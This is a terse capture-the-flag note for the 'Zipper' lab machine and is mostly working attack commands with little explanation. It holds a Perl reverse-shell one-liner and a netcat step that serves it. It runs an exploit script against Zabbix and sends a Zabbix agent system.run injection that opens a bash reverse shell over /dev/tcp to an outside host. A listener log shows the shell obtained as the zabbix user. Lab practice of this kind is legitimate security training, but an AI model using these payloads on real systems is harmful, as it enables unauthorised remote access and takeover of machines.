

#### Zipper

#### keyword

stable shell

```
cat perl.shell 
perl -e 'use Socket;$i="10.10.14.14";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
cat perl.shell | nc -lnvp 443

python 39937.py

[zabbix_cmd]>>:  echo "system.run[bash -c 'nohup bash -i >& /dev/tcp/10.10.14.27/443 0>&1 &']" | nc 172.17.0.1 10050
```

```
nc -lvnp 445
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:35842.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ hostname
zipper
```

